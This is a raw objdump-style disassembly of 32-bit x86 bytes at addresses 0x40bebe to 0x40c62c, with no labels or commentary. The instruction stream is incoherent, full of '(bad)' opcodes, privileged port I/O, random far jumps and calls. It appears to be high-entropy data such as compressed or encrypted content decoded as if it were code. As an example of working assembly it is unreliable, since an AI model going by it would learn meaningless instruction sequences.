  40bebe:	lods   al,BYTE PTR ds:[esi]
  40bebf:	into   
  40bec0:	les    ecx,FWORD PTR [ecx-0x5ef564bc]
  40bec6:	ins    DWORD PTR es:[edi],dx
  40bec7:	sbb    dh,BYTE PTR [eax+0x69b7d865]
  40becd:	add    BYTE PTR [eax],dh
  40becf:	or     bh,BYTE PTR [ecx-0x61891f2d]
  40bed5:	mov    DWORD PTR [ebx+0x37],edx
  40bed8:	sbb    esi,DWORD PTR [ebp-0x6ddeb71b]
  40bede:	jbe    0x40bef6
  40bee0:	cdq    
  40bee1:	fst    QWORD PTR ds:0xb5efbf69
  40bee7:	in     al,dx
  40bee8:	add    DWORD PTR [ebx+esi*2-0x52],esi
  40beec:	and    edi,DWORD PTR [ebp+ebp*1-0x2397272d]
  40bef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bef4:	enter  0x6f4,0x50
  40bef8:	ss enter 0x450d,0x2c
  40befd:	hlt    
  40befe:	push   es
  40beff:	out    0xda,eax
  40bf01:	push   ecx
  40bf02:	add    BYTE PTR [esi-0x6e8f0868],ch
  40bf08:	xor    BYTE PTR [ecx+0x75],0xb0
  40bf0c:	pop    edx
  40bf0d:	mov    ebx,ebp
  40bf0f:	dec    ebx
  40bf10:	xor    DWORD PTR [ecx-0xb],ebx
  40bf13:	test   eax,0x6eff0c78
  40bf18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf19:	fwait
  40bf1a:	out    0x4f,al
  40bf1c:	es push es
  40bf1e:	jae    0x40bf22
  40bf20:	and    edi,esp
  40bf22:	push   cs
  40bf23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf24:	or     edx,ecx
  40bf26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf27:	xchg   DWORD PTR [ebx+0x37],esi
  40bf2a:	adc    DWORD PTR [ecx],esp
  40bf2c:	shl    BYTE PTR [edi],1
  40bf2e:	mov    ss,edx
  40bf30:	xor    ebx,0xf7793bb9
  40bf36:	in     eax,dx
  40bf37:	rol    WORD PTR [edx],0xb1
  40bf3b:	push   esp
  40bf3c:	das    
  40bf3d:	fisubr WORD PTR [esi+0x52]
  40bf40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf41:	data16 mov WORD PTR [edx+0x74a18fd4],fs
  40bf48:	fsubp  st(6),st
  40bf4a:	loope  0x40bf07
  40bf4c:	scas   al,BYTE PTR es:[edi]
  40bf4d:	jno    0x40bf6e
  40bf4f:	push   ebx
  40bf50:	mov    esp,0x903e386c
  40bf55:	enter  0x973c,0xe3
  40bf59:	push   ecx
  40bf5a:	int3   
  40bf5b:	loope  0x40bfbf
  40bf5d:	sub    cl,dh
  40bf5f:	dec    eax
  40bf60:	xlat   BYTE PTR ds:[ebx]
  40bf61:	test   eax,0x49d8c1d0
  40bf66:	push   esi
  40bf67:	mov    edi,0x2159eafc
  40bf6c:	pop    esi
  40bf6d:	jne    0x40bfeb
  40bf6f:	imul   ebp,DWORD PTR [edi+0x1fafe56a],0xffffffbf
  40bf76:	inc    ebx
  40bf77:	das    
  40bf78:	and    BYTE PTR [edi],bl
  40bf7a:	es popa 
  40bf7c:	xchg   ecx,eax
  40bf7d:	xchg   esp,eax
  40bf7e:	mov    eax,0xe64a88f4
  40bf83:	pop    esi
  40bf84:	pushf  
  40bf85:	add    DWORD PTR [ecx],esp
  40bf87:	and    cl,BYTE PTR [ebp+0x5490561]
  40bf8d:	test   DWORD PTR [edi+0x56],ebx
  40bf90:	ss cmp bl,0xfc
  40bf94:	jg     0x40bfa3
  40bf96:	mov    edx,0xbe791f53
  40bf9b:	adc    edi,edi
  40bf9d:	loop   0x40c00c
  40bf9f:	(bad)  ds:[ebx]
  40bfa2:	xchg   esi,eax
  40bfa3:	in     al,dx
  40bfa4:	clc    
  40bfa5:	mov    ecx,0x1e37db82
  40bfaa:	lahf   
  40bfab:	retf   
  40bfac:	imul   ecx,DWORD PTR [ecx],0x901e7d67
  40bfb2:	mov    esp,0xc6ab4c
  40bfb7:	cs enter 0x379e,0x84
  40bfbc:	pop    edi
  40bfbd:	es (bad) 
  40bfbf:	lahf   
  40bfc0:	popf   
  40bfc1:	js     0x40bf60
  40bfc3:	mov    bh,0x94
  40bfc5:	xchg   ecx,eax
  40bfc6:	push   0x240c3a82
  40bfcb:	aam    0xb1
  40bfcd:	sbb    DWORD PTR [esi-0x3f098be],ebx
  40bfd3:	push   esi
  40bfd4:	ss jg  0x40bfb5
  40bfd7:	xor    al,0x6e
  40bfd9:	ds fs test al,0x4d
  40bfdd:	fnsave [esi-0x2826d145]
  40bfe3:	(bad)  
  40bfe4:	in     al,0x6f
  40bfe6:	imul   eax
  40bfe8:	dec    eax
  40bfe9:	hlt    
  40bfea:	xchg   esi,eax
  40bfeb:	std    
  40bfec:	call   0xb331:0xc0a8a885
  40bff3:	retf   
  40bff4:	jmp    0xd02d:0xa9783f8a
  40bffb:	add    al,0x1b
  40bffd:	xchg   ebp,eax
  40bffe:	addr16 or eax,0x2ba5cb58
  40c004:	shl    bh,0x62
  40c007:	icebp  
  40c008:	test   esp,0x9835ff08
  40c00e:	loop   0x40bfa3
  40c010:	xchg   edx,eax
  40c011:	enter  0x6889,0xe6
  40c015:	and    DWORD PTR [ecx+ebx*2-0x65896850],esp
  40c01c:	mov    dh,0x1d
  40c01e:	xchg   ebx,eax
  40c01f:	sbb    ebx,DWORD PTR [esp+eiz*8-0x4]
  40c023:	sbb    bh,BYTE PTR [esi-0x7c4d3c95]
  40c029:	xchg   ecx,eax
  40c02a:	and    ah,cl
  40c02c:	stos   BYTE PTR es:[edi],al
  40c02d:	or     al,0x34
  40c02f:	shl    BYTE PTR [eax+0x79],1
  40c032:	lods   eax,DWORD PTR ds:[esi]
  40c033:	xor    DWORD PTR [edi],edi
  40c035:	push   ecx
  40c036:	mov    cl,0x48
  40c038:	les    edx,FWORD PTR ds:0x447aa12f
  40c03e:	xor    dl,BYTE PTR [ecx]
  40c040:	sbb    ah,al
  40c042:	inc    ebp
  40c043:	mov    edx,0x9692acda
  40c048:	sahf   
  40c049:	xor    esi,DWORD PTR [ecx+0x43dc7422]
  40c04f:	out    dx,al
  40c050:	test   DWORD PTR [ebx],0x88fe0899
  40c056:	dec    eax
  40c057:	out    dx,al
  40c058:	pusha  
  40c059:	lods   al,BYTE PTR ds:[esi]
  40c05a:	pop    esi
  40c05b:	sub    BYTE PTR [esi],bh
  40c05d:	push   edx
  40c05e:	enter  0xa182,0xec
  40c062:	mov    ecx,0x93b7baf4
  40c067:	retf   0xb297
  40c06a:	cmp    DWORD PTR [eax],ebx
  40c06c:	mov    ah,0x26
  40c06e:	test   eax,0x205d1bf0
  40c073:	cmp    al,0xc8
  40c075:	or     al,0xfb
  40c077:	loop   0x40c053
  40c079:	cmp    DWORD PTR [ebp-0x3d],ecx
  40c07c:	sub    esi,ebp
  40c07e:	push   ebx
  40c07f:	xor    DWORD PTR [edi-0x411e13a9],eax
  40c085:	into   
  40c086:	cmp    bl,BYTE PTR [edx]
  40c088:	mov    ah,BYTE PTR [ecx-0x54]
  40c08b:	popf   
  40c08c:	call   0xe74e45cf
  40c091:	sbb    BYTE PTR [edx+0x26],bh
  40c094:	test   eax,0x314a7dad
  40c099:	pop    esp
  40c09a:	jbe    0x40c073
  40c09c:	and    al,cl
  40c09e:	std    
  40c09f:	fisttp WORD PTR [ebp-0x728aa90d]
  40c0a5:	pop    es
  40c0a6:	out    0x4,eax
  40c0a8:	mov    dl,0x5c
  40c0aa:	sbb    ch,BYTE PTR [ebx+0x259f5f5f]
  40c0b0:	or     al,0xb5
  40c0b2:	scas   eax,DWORD PTR es:[edi]
  40c0b3:	inc    esp
  40c0b4:	cmp    edx,edx
  40c0b6:	(bad)  
  40c0b8:	mov    BYTE PTR [edx],bh
  40c0ba:	sbb    BYTE PTR [edx],ch
  40c0bc:	add    cl,BYTE PTR [edx+0x15cc386c]
  40c0c2:	in     eax,0x97
  40c0c4:	inc    ebx
  40c0c5:	pop    ebx
  40c0c6:	push   ecx
  40c0c7:	icebp  
  40c0c8:	push   esi
  40c0c9:	popf   
  40c0ca:	daa    
  40c0cb:	mov    ds:0x5f662c84,al
  40c0d0:	pop    ebx
  40c0d1:	ss dec ebp
  40c0d3:	sub    al,bl
  40c0d5:	pop    ss
  40c0d6:	pinsrw mm5,WORD PTR [eax],0xfc
  40c0da:	ss aaa 
  40c0dc:	test   cl,0x58
  40c0df:	inc    ecx
  40c0e0:	test   eax,edi
  40c0e2:	loopne 0x40c10b
  40c0e4:	xor    al,0x4b
  40c0e6:	dec    esp
  40c0e7:	and    al,0x6f
  40c0e9:	js     0x40c0f3
  40c0eb:	push   es
  40c0ec:	xchg   BYTE PTR [esi-0xc],dh
  40c0ef:	arpl   cx,sp
  40c0f1:	jecxz  0x40c14d
  40c0f3:	ss out 0xb7,al
  40c0f6:	dec    esi
  40c0f7:	fadd   QWORD PTR [edi-0x6f]
  40c0fa:	out    0xa7,al
  40c0fc:	xchg   ebx,eax
  40c0fd:	or     eax,ebx
  40c0ff:	xchg   edx,eax
  40c100:	int3   
  40c101:	loopne 0x40c0ae
  40c103:	test   eax,0x65565d4d
  40c108:	push   eax
  40c109:	adc    edx,DWORD PTR [ecx]
  40c10b:	inc    ebx
  40c10c:	push   ebp
  40c10d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c10e:	imul   ebp,esi,0x46
  40c111:	(bad)  
  40c112:	aas    
  40c113:	inc    ecx
  40c114:	jb     0x40c101
  40c116:	sbb    eax,0x53df8502
  40c11b:	call   0x23b8:0xe5db43a9
  40c122:	xor    bh,dh
  40c124:	pop    edi
  40c125:	out    0x2f,al
  40c127:	xor    edx,eax
  40c129:	and    eax,0x88184f53
  40c12e:	push   eax
  40c12f:	sub    dh,BYTE PTR [esi]
  40c131:	xchg   ebp,eax
  40c132:	sub    al,0x62
  40c134:	lds    ebp,FWORD PTR [ebx+0x2d1a9b7a]
  40c13a:	les    edi,FWORD PTR [esi+0x1667deb2]
  40c140:	push   ss
  40c141:	ucomiss xmm2,DWORD PTR [esp+ebp*4+0x3d]
  40c146:	xchg   edi,eax
  40c147:	push   esp
  40c148:	pop    ds
  40c149:	or     eax,0x1f1f42b0
  40c14e:	jbe    0x40c10f
  40c150:	stos   DWORD PTR es:[edi],eax
  40c151:	and    eax,0x635cd53a
  40c156:	(bad)  
  40c157:	lods   al,BYTE PTR ds:[esi]
  40c158:	adc    bl,bl
  40c15a:	sahf   
  40c15b:	clc    
  40c15c:	and    bh,BYTE PTR [ecx-0x21]
  40c15f:	rcl    BYTE PTR [eax-0x41423dc5],cl
  40c165:	sbb    esp,ebp
  40c167:	aas    
  40c168:	(bad)  
  40c16a:	xchg   ebp,eax
  40c16b:	in     al,0xd9
  40c16d:	pop    edi
  40c16e:	bound  edx,QWORD PTR [ebp+0x52]
  40c171:	fs ds cli 
  40c174:	lahf   
  40c175:	repz daa 
  40c177:	dec    ebx
  40c178:	sub    eax,0x36cbce51
  40c17d:	jl     0x40c119
  40c17f:	test   eax,0xd2a342a
  40c184:	and    al,0x1d
  40c186:	pushf  
  40c187:	xor    ebp,DWORD PTR [ebx-0x69]
  40c18a:	mov    ah,0xc0
  40c18c:	(bad)  
  40c18d:	scas   al,BYTE PTR es:[edi]
  40c18e:	jge    0x40c13e
  40c190:	xchg   edi,eax
  40c191:	clc    
  40c192:	out    dx,al
  40c193:	rol    BYTE PTR [ebx-0x26],cl
  40c196:	in     eax,0x27
  40c198:	fdiv   QWORD PTR [eax]
  40c19a:	test   al,0x7a
  40c19c:	mov    dl,0x32
  40c19e:	cmp    BYTE PTR [ebp+0x61],ah
  40c1a1:	dec    edx
  40c1a2:	cwde   
  40c1a3:	cmc    
  40c1a4:	cmp    eax,0x4fccad8f
  40c1a9:	adc    BYTE PTR [edx-0x5bc5f026],0x79
  40c1b0:	jne    0x40c157
  40c1b2:	add    BYTE PTR [ecx],cl
  40c1b4:	adc    ah,BYTE PTR [edx-0x8fbccec]
  40c1ba:	jno    0x40c174
  40c1bc:	sbb    edx,ebp
  40c1be:	(bad)  
  40c1bf:	icebp  
  40c1c0:	xor    esi,DWORD PTR [esi+eiz*8+0x7f68e06b]
  40c1c7:	aad    0x15
  40c1c9:	pop    edi
  40c1ca:	mov    dh,0x8e
  40c1cc:	mov    WORD PTR [edi+esi*8-0x6167e29],fs
  40c1d3:	dec    eax
  40c1d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1d5:	ret    0x8337
  40c1d8:	xor    edi,DWORD PTR [edx-0x48ab194d]
  40c1de:	jl     0x40c19e
  40c1e0:	sbb    eax,0xd03a1786
  40c1e5:	bswap  esp
  40c1e7:	or     DWORD PTR [ecx-0x92b4cdb],edx
  40c1ed:	add    eax,0x8e2d4239
  40c1f2:	push   es
  40c1f3:	mov    eax,ds:0x7b5deafe
  40c1f8:	cmp    esi,DWORD PTR [edi]
  40c1fa:	jmp    0x3e7c:0x8e30bcba
  40c201:	pop    ebx
  40c202:	shl    al,1
  40c204:	call   0xb7b6:0xcff39044
  40c20b:	pop    ebp
  40c20c:	sub    ecx,0xfffffffb
  40c20f:	or     ebx,DWORD PTR [esi]
  40c211:	adc    edi,DWORD PTR [eax+0x12f10c6b]
  40c217:	push   ebx
  40c218:	jbe    0x40c1da
  40c21a:	add    eax,0x438e318
  40c21f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c220:	popf   
  40c221:	cmp    ebx,DWORD PTR [esi+0x46]
  40c224:	lahf   
  40c225:	lock cmp al,0x54
  40c228:	and    bh,dl
  40c22a:	sbb    al,0x3c
  40c22c:	mov    esi,0x1b801eba
  40c231:	sbb    ebx,DWORD PTR [ecx+0x19]
  40c234:	push   edx
  40c235:	scas   al,BYTE PTR es:[edi]
  40c236:	ss stc 
  40c238:	jmp    0x40c21b
  40c23a:	fstp   QWORD PTR [ebp+0x69d53292]
  40c240:	xchg   edi,eax
  40c241:	adc    dl,BYTE PTR [edi]
  40c243:	cmp    eax,0xfc09287f
  40c248:	clc    
  40c249:	scas   al,BYTE PTR es:[edi]
  40c24a:	mov    ecx,0x3cfce26c
  40c24f:	lahf   
  40c250:	push   ecx
  40c251:	imul   edx,DWORD PTR [edi-0x2c],0xecd11f97
  40c258:	mov    bh,0xb6
  40c25a:	pop    edi
  40c25b:	sbb    al,0xb4
  40c25d:	dec    ebx
  40c25e:	jmp    0x40c1ff
  40c260:	inc    ebx
  40c261:	test   eax,0xa0f700af
  40c266:	sbb    DWORD PTR [esi],0x3c35f516
  40c26c:	mov    ds:0x218c8afc,al
  40c271:	stos   BYTE PTR es:[edi],al
  40c272:	rol    BYTE PTR [ebp+0x70],0x1e
  40c276:	xchg   esi,eax
  40c277:	(bad)  
  40c278:	aas    
  40c279:	cli    
  40c27a:	jmp    0x72fb:0xa5cd810a
  40c281:	pop    esp
  40c282:	and    al,0xa2
  40c284:	mov    ss:0x2e4aaf8b,al
  40c28a:	pop    ebx
  40c28b:	sub    bh,cl
  40c28d:	ret    
  40c28e:	js     0x40c29f
  40c290:	xor    bh,dl
  40c292:	jb     0x40c2cc
  40c294:	js     0x40c235
  40c296:	sbb    ebx,DWORD PTR [ebx+edx*4]
  40c299:	mov    ch,0x31
  40c29b:	and    DWORD PTR [esi],ebx
  40c29d:	dec    edx
  40c29e:	adc    DWORD PTR [ebx+edx*8-0x28],ebx
  40c2a2:	mov    edx,0x4b9a0db1
  40c2a7:	pushf  
  40c2a8:	(bad)  
  40c2a9:	repnz cmp BYTE PTR [eax],0x34
  40c2ad:	ds or  al,0xed
  40c2b0:	xchg   esp,eax
  40c2b1:	jmp    0xb93:0x53699bb5
  40c2b8:	mov    dl,0xd2
  40c2ba:	push   ss
  40c2bb:	std    
  40c2bc:	pop    esi
  40c2bd:	inc    ebp
  40c2be:	rcr    bl,0xe2
  40c2c1:	add    ah,BYTE PTR ss:[eax]
  40c2c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2c5:	scas   eax,DWORD PTR es:[edi]
  40c2c6:	inc    esp
  40c2c7:	test   DWORD PTR [edx],ecx
  40c2c9:	sbb    al,0x87
  40c2cb:	xor    DWORD PTR [edx+esi*1+0x71],ebx
  40c2cf:	in     eax,0x93
  40c2d1:	pop    ss
  40c2d2:	scas   eax,DWORD PTR es:[edi]
  40c2d3:	mov    dh,0x8e
  40c2d5:	loopne 0x40c284
  40c2d7:	jnp    0x40c2aa
  40c2d9:	mov    ds:0xb7a1a7c8,eax
  40c2de:	lea    eax,[ebx-0x57]
  40c2e1:	sub    ecx,ebp
  40c2e3:	xchg   esi,ecx
  40c2e5:	add    BYTE PTR ds:0xca352a02,bh
  40c2eb:	or     DWORD PTR [esi],ebx
  40c2ed:	push   esp
  40c2ee:	pop    ebx
  40c2ef:	inc    edi
  40c2f0:	aad    0x89
  40c2f2:	inc    esp
  40c2f3:	loop   0x40c2b9
  40c2f5:	call   0x61ce2bde
  40c2fa:	push   ds
  40c2fb:	jmp    0x40c301
  40c2fd:	pop    ebx
  40c2fe:	imul   ebx,DWORD PTR [esi-0x337ddb1b],0x2b
  40c305:	nop
  40c306:	ja     0x40c28d
  40c308:	and    DWORD PTR [edi-0x33],ebp
  40c30b:	in     eax,0xb1
  40c30d:	and    DWORD PTR [edx],ebp
  40c30f:	dec    edi
  40c310:	jg     0x40c388
  40c312:	jno    0x40c2ca
  40c314:	cld    
  40c315:	sub    al,0x13
  40c317:	mov    BYTE PTR [edx+0x29d09307],dl
  40c31d:	das    
  40c31e:	add    esi,eax
  40c320:	add    DWORD PTR [eax+esi*8+0x17],eax
  40c324:	out    dx,eax
  40c325:	sbb    ecx,DWORD PTR fs:0x4803a92f
  40c32c:	ja     0x40c31d
  40c32e:	ds loopne 0x40c3a1
  40c331:	lods   eax,DWORD PTR ds:[esi]
  40c332:	test   BYTE PTR [ebx],dl
  40c334:	sbb    eax,0x156cf2d7
  40c339:	sub    al,0x6e
  40c33b:	xchg   DWORD PTR [ebx+0x4b],ebp
  40c33e:	lahf   
  40c33f:	int    0xcb
  40c341:	jns    0x40c2d3
  40c343:	jp     0x40c39b
  40c345:	xchg   edx,eax
  40c346:	add    al,0x70
  40c348:	shl    ah,1
  40c34a:	xor    esi,DWORD PTR [esi+ebp*2+0x76c00318]
  40c351:	cmc    
  40c352:	mov    ds,WORD PTR [esi]
  40c354:	out    dx,al
  40c355:	dec    ecx
  40c356:	mov    ds:0x82187fcd,eax
  40c35b:	call   0xb17382c1
  40c360:	pop    edx
  40c361:	out    0x46,al
  40c363:	daa    
  40c364:	test   BYTE PTR [eax+eax*2+0x26],bh
  40c368:	pop    ebp
  40c369:	cmp    ah,BYTE PTR [eax+0x14016eec]
  40c36f:	inc    edi
  40c370:	pushw  0x8293
  40c374:	pop    edi
  40c375:	inc    edx
  40c376:	pop    ecx
  40c377:	mov    dl,0xcc
  40c379:	mov    ebx,0xd3bd3b6c
  40c37e:	cmp    eax,DWORD PTR [esi+0x34189bbc]
  40c384:	ds or  eax,0x52f1a57a
  40c38a:	call   0x812c421a
  40c38f:	mov    eax,0xefe4c72f
  40c394:	mov    ds:0xcc748167,al
  40c399:	push   ebx
  40c39a:	push   ebx
  40c39b:	fdivr  DWORD PTR [ecx+ebp*4+0x5377c009]
  40c3a2:	mov    bh,0xc8
  40c3a4:	shr    DWORD PTR [esi+0x5c],cl
  40c3a7:	loop   0x40c35b
  40c3a9:	mov    dl,0x58
  40c3ab:	pop    es
  40c3ac:	or     dl,0xc9
  40c3af:	ficom  WORD PTR [eax+0x7]
  40c3b2:	mul    DWORD PTR [ebx-0x578d4e75]
  40c3b8:	jmp    0xe8c2:0x13e5840a
  40c3bf:	inc    ecx
  40c3c0:	mov    ebx,0x1b5007c8
  40c3c5:	shl    BYTE PTR [ebx+0xd],1
  40c3c8:	push   ss
  40c3c9:	shr    DWORD PTR ds:0x5e72c26,1
  40c3cf:	inc    esp
  40c3d0:	cmc    
  40c3d1:	mov    esp,0x7e6c1bc6
  40c3d6:	daa    
  40c3d7:	in     al,dx
  40c3d8:	and    ch,BYTE PTR [esp+edi*1]
  40c3db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3dc:	cli    
  40c3dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3de:	jl     0x40c3f3
  40c3e0:	outs   dx,DWORD PTR ds:[esi]
  40c3e1:	mov    esi,0x93d3844e
  40c3e6:	dec    ecx
  40c3e7:	and    al,0x1c
  40c3e9:	stos   BYTE PTR es:[edi],al
  40c3ea:	sub    dh,BYTE PTR [ecx+0x3044e204]
  40c3f0:	and    DWORD PTR [ebp-0x26],edi
  40c3f3:	xchg   esi,eax
  40c3f4:	jmp    0x30e741fa
  40c3f9:	jle    0x40c467
  40c3fb:	clc    
  40c3fc:	shl    BYTE PTR [ebx-0xb6f9cce],cl
  40c402:	inc    ebp
  40c403:	mov    ?,WORD PTR [ebx]
  40c405:	xchg   dh,ah
  40c407:	repnz pop edi
  40c409:	(bad)  
  40c40a:	push   0xe00e8e47
  40c40f:	iret   
  40c410:	push   edi
  40c411:	dec    ecx
  40c412:	fldcw  WORD PTR [ecx+0x30]
  40c415:	fistp  DWORD PTR [ecx]
  40c417:	test   BYTE PTR [edx+0x76],dl
  40c41a:	je     0x40c476
  40c41c:	in     eax,0xb1
  40c41e:	retf   0x85ac
  40c421:	dec    edx
  40c422:	cmp    edi,DWORD PTR [edi-0x63743b68]
  40c428:	cmc    
  40c429:	adc    bh,BYTE PTR [edx+ebp*8]
  40c42c:	cmp    ch,BYTE PTR [ebx]
  40c42e:	retf   0x8e00
  40c431:	adc    BYTE PTR [ecx],bl
  40c433:	jo     0x40c465
  40c435:	pop    ecx
  40c436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c437:	cmp    al,0xb9
  40c439:	push   edx
  40c43a:	mov    eax,0xbc34242
  40c43f:	ret    
  40c440:	sbb    eax,0xbd47fbe9
  40c445:	dec    edx
  40c446:	les    ecx,FWORD PTR [ebp-0x4a]
  40c449:	(bad)  
  40c44a:	jle    0x40c498
  40c44c:	xor    BYTE PTR [edi+0x6d],0x30
  40c450:	mov    bh,0x70
  40c452:	or     al,0x81
  40c454:	pushf  
  40c455:	add    BYTE PTR [edx-0x1f],dl
  40c458:	(bad)  
  40c459:	fisttp DWORD PTR [eax]
  40c45b:	call   0x3d7d:0x27e21d3d
  40c462:	mov    al,ds:0x5a52d361
  40c467:	shr    DWORD PTR [esi-0x5483cc10],0x7b
  40c46e:	sar    ah,0x30
  40c471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c472:	xlat   BYTE PTR ds:[ebx]
  40c473:	(bad)  
  40c474:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c475:	inc    esi
  40c476:	sbb    bl,BYTE PTR [ebx]
  40c478:	push   esi
  40c479:	mov    BYTE PTR [edi],al
  40c47b:	jae    0x40c456
  40c47d:	mov    dh,0x9f
  40c47f:	clc    
  40c480:	std    
  40c481:	mov    WORD PTR [ebx],?
  40c483:	lds    edi,FWORD PTR [esi+0x41cb9465]
  40c489:	jmp    0x7c9a41b
  40c48e:	mov    ebx,0xc692075f
  40c493:	mov    eax,0xf17de7f6
  40c498:	lea    ebp,es:[ecx+0x6e]
  40c49c:	retf   0xce42
  40c49f:	push   esi
  40c4a0:	and    ch,al
  40c4a2:	xor    ebp,DWORD PTR [ecx+0x1cf61b4b]
  40c4a8:	jae    0x40c523
  40c4aa:	ror    eax,0xf8
  40c4ad:	xchg   ecx,eax
  40c4ae:	mov    WORD PTR [edx],?
  40c4b0:	cdq    
  40c4b1:	aaa    
  40c4b2:	and    eax,0x2903cb44
  40c4b7:	addr16 std 
  40c4b9:	ja     0x40c50c
  40c4bb:	sub    DWORD PTR [eax-0xeccffe7],0x9f7bba9e
  40c4c5:	ja     0x40c483
  40c4c7:	inc    esp
  40c4c8:	xchg   ebx,eax
  40c4c9:	mov    ds:0xc7d288ac,eax
  40c4ce:	mov    bh,0x45
  40c4d0:	call   0x7016d09
  40c4d5:	mov    esp,0xd6ead00a
  40c4da:	lock fiadd DWORD PTR [edx+eiz*1+0x2c]
  40c4df:	pop    esp
  40c4e0:	and    esi,DWORD PTR [edx+0x47]
  40c4e3:	dec    ebp
  40c4e4:	scas   al,BYTE PTR es:[edi]
  40c4e5:	push   eax
  40c4e6:	hlt    
  40c4e7:	cmc    
  40c4e8:	sub    al,0xa5
  40c4ea:	into   
  40c4eb:	cs lock push ebp
  40c4ee:	mov    dh,BYTE PTR [ecx+0x2b]
  40c4f1:	jge    0x40c531
  40c4f3:	cli    
  40c4f4:	retf   
  40c4f5:	or     DWORD PTR [ecx+eiz*4-0x7d65ffc2],edi
  40c4fc:	mov    fs,WORD PTR [ebx]
  40c4fe:	pop    eax
  40c4ff:	sbb    al,0xe9
  40c501:	outs   dx,BYTE PTR ds:[esi]
  40c502:	int3   
  40c503:	xchg   edi,eax
  40c504:	adc    al,0x58
  40c506:	add    eax,0xc57b32db
  40c50b:	fwait
  40c50c:	pushf  
  40c50d:	bound  edi,QWORD PTR [ebp-0x73]
  40c510:	sub    ecx,DWORD PTR [edx+0x74533e2]
  40c516:	pusha  
  40c517:	rcr    DWORD PTR [eax-0x7f],1
  40c51a:	stc    
  40c51b:	push   ebx
  40c51c:	inc    BYTE PTR [ebx+0x68]
  40c51f:	aad    0x2a
  40c521:	stos   DWORD PTR es:[edi],eax
  40c522:	arpl   WORD PTR [edi+eax*8-0x17adb79],di
  40c529:	js     0x40c4cf
  40c52b:	fsubr  QWORD PTR [ecx+0x32]
  40c52e:	(bad)  
  40c52f:	(bad)  
  40c530:	xchg   edi,eax
  40c531:	lahf   
  40c532:	jnp    0x40c4f3
  40c534:	and    eax,0xd6d0b405
  40c539:	inc    edx
  40c53a:	out    0x5f,al
  40c53c:	pop    ds
  40c53d:	or     DWORD PTR [edx+0x58c7e1c],edi
  40c543:	xor    cl,BYTE PTR [esi+ebp*8-0x17493713]
  40c54a:	(bad)  [edi+edx*4]
  40c54d:	(bad)  
  40c54e:	jecxz  0x40c53d
  40c550:	sbb    eax,0x258f6b81
  40c555:	fdiv   DWORD PTR [edi+0x27c5ea59]
  40c55b:	nop
  40c55c:	xchg   edi,eax
  40c55d:	cld    
  40c55e:	cs push cs
  40c560:	sub    BYTE PTR ds:0x497642c6,bl
  40c566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c567:	jmp    0x40c5b8
  40c569:	adc    eax,0xcbc9ffa
  40c56e:	das    
  40c56f:	sub    al,al
  40c571:	sub    esp,DWORD PTR [ebx+0x2c8a7602]
  40c577:	and    esp,esp
  40c579:	fistp  QWORD PTR [eax-0x51]
  40c57c:	int    0xf0
  40c57e:	aam    0x38
  40c580:	sbb    eax,0x1a48234
  40c585:	(bad)  
  40c586:	cld    
  40c587:	cmp    ah,dl
  40c589:	cmp    edx,esp
  40c58b:	add    BYTE PTR [eax+0x31ba78a6],ah
  40c591:	mov    DWORD PTR [esp+ebp*4+0x39],ecx
  40c595:	sub    bl,BYTE PTR [ebp+0x43d22d1a]
  40c59b:	leave  
  40c59c:	mov    dl,BYTE PTR [esi+0x413f9b77]
  40c5a2:	in     al,dx
  40c5a3:	out    0x8d,eax
  40c5a5:	loop   0x40c581
  40c5a7:	adc    ch,bh
  40c5a9:	jns    0x40c607
  40c5ab:	xchg   DWORD PTR [ecx],edx
  40c5ad:	and    DWORD PTR [edx-0x6faab378],ebx
  40c5b3:	cld    
  40c5b4:	test   BYTE PTR [ebx],al
  40c5b6:	mov    ebx,esp
  40c5b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5b9:	jecxz  0x40c58a
  40c5bb:	bound  edx,QWORD PTR cs:[ecx-0x5a41c9c]
  40c5c2:	xchg   edi,eax
  40c5c3:	mov    edi,0x3e289f39
  40c5c8:	jmp    0x40c5ac
  40c5ca:	dec    ebx
  40c5cb:	mov    edx,0x1693d6ef
  40c5d0:	sbb    DWORD PTR [ebp-0x68],esp
  40c5d3:	(bad)  
  40c5d4:	jl     0x40c5a1
  40c5d6:	push   edx
  40c5d7:	das    
  40c5d8:	cld    
  40c5d9:	mov    dh,0x7d
  40c5db:	into   
  40c5dc:	pop    ss
  40c5dd:	movsx  eax,BYTE PTR [edx]
  40c5e0:	or     al,0x70
  40c5e2:	adc    al,0xc
  40c5e4:	inc    ecx
  40c5e5:	adc    eax,0x8390ed10
  40c5ea:	outs   dx,BYTE PTR ds:[esi]
  40c5eb:	in     al,0xc4
  40c5ed:	pop    eax
  40c5ef:	int    0x14
  40c5f1:	jge    0x40c63c
  40c5f3:	cld    
  40c5f4:	(bad)  
  40c5f5:	into   
  40c5f6:	adc    DWORD PTR [eax],ecx
  40c5f8:	imul   ebx,ebx,0xffffffdc
  40c5fb:	fisttp DWORD PTR [eax+0x2d]
  40c5fe:	cld    
  40c5ff:	pop    ss
  40c600:	xor    edi,DWORD PTR [ebx-0x51]
  40c603:	mul    BYTE PTR [ebp+0x11]
  40c606:	js     0x40c62b
  40c608:	mov    al,0x6c
  40c60a:	loope  0x40c664
  40c60c:	sahf   
  40c60d:	popa   
  40c60e:	shl    DWORD PTR [edi+eiz*1+0x27fb32a3],0x14
  40c616:	pop    ebp
  40c617:	add    ebp,eax
  40c619:	mov    eax,0x20e8be64
  40c61e:	push   cs
  40c61f:	and    BYTE PTR [esi+ebp*2-0x23918526],bl
  40c626:	pop    es
  40c627:	or     al,0xf8
  40c629:	cmp    BYTE PTR [eax],0x36
  40c62c:	je     0x40c5c6
